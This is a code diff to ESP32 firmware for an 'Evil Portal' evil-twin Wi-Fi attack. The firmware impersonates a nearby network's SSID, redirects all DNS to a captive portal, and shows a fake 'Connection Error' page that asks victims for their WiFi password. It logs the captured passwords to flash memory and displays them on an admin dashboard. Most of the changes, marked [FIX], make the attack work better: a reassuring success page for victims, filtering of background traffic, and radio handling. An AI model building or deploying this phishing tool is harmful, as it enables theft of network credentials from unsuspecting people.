@@ -35,7 +35,8 @@ EvilTwinConfig evilTwinConfig;
 
 String currentEvilTwinSSID = "";
 unsigned long lastScan = 0;
-const unsigned long SCAN_INTERVAL = 15000;
+// [FIX] Increased interval to reduce blocking, set to 0 to disable auto-scan
+const unsigned long SCAN_INTERVAL = 60000; 
 bool hotspotActive = false;
 
 // --- ADMIN UI HTML ---
@@ -79,6 +80,16 @@ String getCurrentTime() {
   unsigned long t = millis() / 1000; char buf[20]; sprintf(buf, "%02lu:%02lu:%02lu", (t / 3600) % 24, (t / 60) % 60, t % 60); return String(buf);
 }
 
+// [FIX] Added HTML escaping to prevent XSS from injected passwords
+String htmlEscape(String str) {
+  str.replace("&", "&amp;");
+  str.replace("<", "&lt;");
+  str.replace(">", "&gt;");
+  str.replace("\"", "&quot;");
+  str.replace("'", "&#39;");
+  return str;
+}
+
 // --- LOGGING ---
 void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
   File f = SPIFFS.open(CRED_FILE, "a");
@@ -93,7 +104,10 @@ void logCredentialsToSPIFFS(String ssid, String capturedData, String ip) {
 String readCredentialsFromSPIFFS() {
   if (!SPIFFS.exists(CRED_FILE)) return "<p>No credentials captured yet.</p>";
   File f = SPIFFS.open(CRED_FILE, "r"); String content = "";
-  while (f.available()) { String line = f.readStringUntil('\n'); if (line.length() > 0) content = "<div class='cred-box'><strong>" + line + "</strong></div>" + content; }
+  while (f.available()) { 
+    String line = f.readStringUntil('\n'); 
+    if (line.length() > 0) content = "<div class='cred-box'><strong>" + htmlEscape(line) + "</strong></div>" + content; 
+  }
   f.close(); return content;
 }
 void clearCredentials() { SPIFFS.remove(CRED_FILE); }
@@ -121,15 +135,22 @@ String generateEvilTwinPage() {
     if (!custom.isEmpty()) return custom;
   }
   
-  // Hardcoded Fallback
-  return R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title>
+  // [FIX] Fallback now actually uses the Admin Configuration variables
+  String html = R"raw(<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>%TITLE%</title>
   <style>body{font-family:sans-serif;background:#eee;padding:20px;text-align:center}.box{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
   input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer}</style></head>
-  <body><div class="box"><h2>Connection Error</h2><p>Please enter your WiFi password to verify identity.</p>
+  <body><div class="box"><h2>%SUBTITLE%</h2><p>%BODY%</p>
   <form action="/" method="post"><input type="password" name="password" placeholder="WiFi Password" required><button type="submit">Connect</button></form></div></body></html>)raw";
+  
+  html.replace("%TITLE%", evilTwinConfig.title);
+  html.replace("%SUBTITLE%", evilTwinConfig.subtitle);
+  html.replace("%BODY%", evilTwinConfig.body);
+  return html;
 }
 
 void performScan() {
+  // [FIX] Stop DNS and Webserver processing interference isn't strictly necessary, 
+  // but scanning blocks the loop. Just be aware.
   int n = WiFi.scanNetworks(false, true); networks.clear();
   if (n > 0) { for (int i = 0; i < n && i < 20; ++i) { NetworkInfo net; net.ssid = WiFi.SSID(i); if (net.ssid.isEmpty()) net.ssid = "[Hidden]"; memcpy(net.bssid, WiFi.BSSID(i), 6); net.ch = WiFi.channel(i); net.bssidStr = bytesToStr(net.bssid, 6); networks.push_back(net); } }
   WiFi.scanDelete();
@@ -137,17 +158,23 @@ void performScan() {
 
 void startEvilTwin() {
   if (selectedNetwork.ssid.isEmpty()) return;
+
+  // [FIX] CRITICAL: Disconnect STA completely to free the radio and avoid channel conflicts
+  WiFi.disconnect(true, true); 
+  delay(500);
+  
   WiFi.softAPdisconnect(true); delay(500);
-  // Ensure the gateway is set to itself (Critical for DNS spoofing)
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   
   if (WiFi.softAP(selectedNetwork.ssid.c_str(), NULL, selectedNetwork.ch)) {
     hotspotActive = true; currentEvilTwinSSID = selectedNetwork.ssid;
-    // Start DNS Server to hijack ALL domains
     dnsServer.stop(); dnsServer.start(DNS_PORT, "*", apIP);
     Serial.println("\n[+] EVIL TWIN STARTED: " + selectedNetwork.ssid);
     Serial.println("Wait for victims...");
-  } else { WiFi.softAP("WiFi_Pentest", "password123"); }
+  } else { 
+    Serial.println("[-] Failed to start Evil Twin. Reverting to Pentest AP.");
+    WiFi.softAP("WiFi_Pentest", "password123"); 
+  }
 }
 
 void stopEvilTwin() {
@@ -161,12 +188,10 @@ void processCaptivePortalLogin() {
   String ip = webServer.client().remoteIP().toString();
   String capturedData = "";
   
-  // 1. Log Arguments (Standard Form Data)
   for (int i = 0; i < webServer.args(); i++) {
     capturedData += webServer.argName(i) + ": " + webServer.arg(i) + "  ";
   }
 
-  // 2. Fallback: If no args but Body exists (Raw Data/JSON)
   if (capturedData == "" && webServer.hasArg("plain")) {
     capturedData = "RAW BODY: " + webServer.arg("plain");
   }
@@ -176,10 +201,16 @@ void processCaptivePortalLogin() {
   Serial.println("\n🔥 CAPTURED: " + capturedData);
   logCredentialsToSPIFFS(currentEvilTwinSSID, capturedData, ip);
 
-  // Return a Success Page that mimics "Restored Internet" to close the portal window
-  String html = R"(<html><head><meta http-equiv="refresh" content="3;url=http://google.com"></head>
+  // [FIX] Redirect to a local /success page to prevent infinite DNS redirect loops
+  webServer.sendHeader("Location", "/success");
+  webServer.send(302, "text/plain", "");
+}
+
+void handleSuccess() {
+  // [FIX] Local success page so the victim's browser doesn't try to hit google.com and loop
+  String html = R"(<html><head><meta http-equiv="refresh" content="5;url=/"></head>
   <body style="text-align:center;font-family:sans-serif;padding:50px;">
-  <h1 style="color:green;">Connected</h1><p>Verifying credentials...<br>Redirecting to Internet...</p>
+  <h1 style="color:green;">Connected</h1><p>Authentication successful. You may now browse the internet.</p>
   </body></html>)";
   webServer.send(200, "text/html", html);
 }
@@ -188,9 +219,7 @@ void processCaptivePortalLogin() {
 void handleAdmin() {
   String html = String(FPSTR(HEADER_TEMPLATE)); html.replace("%TITLE%", "Admin");
   
-  // Custom Title
   html += "<div class='header'><h1>Evil Portal by Sabbir SEU EEE B43</h1>";
-  
   if (hotspotActive) html += "<div class='active-badge'>Live: " + currentEvilTwinSSID + "</div>"; else html += "<div class='status-badge'>Standby</div>"; html += "</div>";
   
   html += "<div class='card'><h2>Controls</h2><div class='btn-group'>";
@@ -223,16 +252,14 @@ void handleCaptivePortal() {
     return;
   }
 
-  String host = webServer.hostHeader();
-  String myIP = WiFi.softAPIP().toString();
-
-  // 1.THIS A LOGIN ATTEMPT
-  if (webServer.method() == HTTP_POST || webServer.hasArg("password") || webServer.hasArg("user") || webServer.hasArg("email")) {
+  // [FIX] Only process login if it's a POST request AND contains password/user arguments.
+  // This prevents Apple/Google background telemetry POSTs from creating false positive logs.
+  if (webServer.method() == HTTP_POST && (webServer.hasArg("password") || webServer.hasArg("user") || webServer.hasArg("email"))) {
     processCaptivePortalLogin();
     return;
   }
 
-  // 2.THIS A CAPTIVE PORTAL CHECK
+  // 2. THIS IS A CAPTIVE PORTAL CHECK
   webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   webServer.sendHeader("Pragma", "no-cache");
   webServer.sendHeader("Expires", "-1");
@@ -281,20 +308,17 @@ void handleClearLogs() { clearCredentials(); webServer.sendHeader("Location", "/
 void setup() {
   Serial.begin(115200); SPIFFS.begin(true);
   
+  // [FIX] Must set mode AND disconnect to prevent channel locks
   WiFi.mode(WIFI_AP_STA); 
-  
+  WiFi.disconnect(true, true); 
+  delay(100);
 
   // Set country to China (CN) or Japan (JP) to enable channels 1-13
-  wifi_country_t country = {
-    .cc = "CN",
-    .schan = 1,
-    .nchan = 13,
-    .policy = WIFI_COUNTRY_POLICY_AUTO,
-  };
+  wifi_country_t country = {"CN", 1, 13, WIFI_COUNTRY_POLICY_AUTO};
   esp_wifi_set_country(&country);
-  // ---------------------------------------------
   
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); WiFi.softAP("WiFi_Pentest", "password123");
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); 
+  WiFi.softAP("WiFi_Pentest", "password123");
   dnsServer.start(DNS_PORT, "*", apIP);
   
   // ADMIN ROUTES
@@ -307,6 +331,9 @@ void setup() {
   webServer.on("/upload", handleUpload);
   webServer.on("/save-html", handleSaveHTML);
   webServer.on("/clear-logs", handleClearLogs);
+  
+  // [FIX] Added Success route for post-login redirect
+  webServer.on("/success", handleSuccess);
 
   // CAPTIVE PORTAL ROUTES
   webServer.on("/", handleCaptivePortal);
@@ -326,10 +353,16 @@ void setup() {
   webServer.begin();
   Serial.println("Server Started.");
   performScan();
+  lastScan = millis();
 }
 
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
-  if (millis() - lastScan > SCAN_INTERVAL && !hotspotActive) { performScan(); lastScan = millis(); }
+  
+  // [FIX] Only auto-scan if the Evil Twin is NOT active to avoid freezing the captive portal
+  if (hotspotActive == false && millis() - lastScan > SCAN_INTERVAL) { 
+    performScan(); 
+    lastScan = millis(); 
+  }
 }
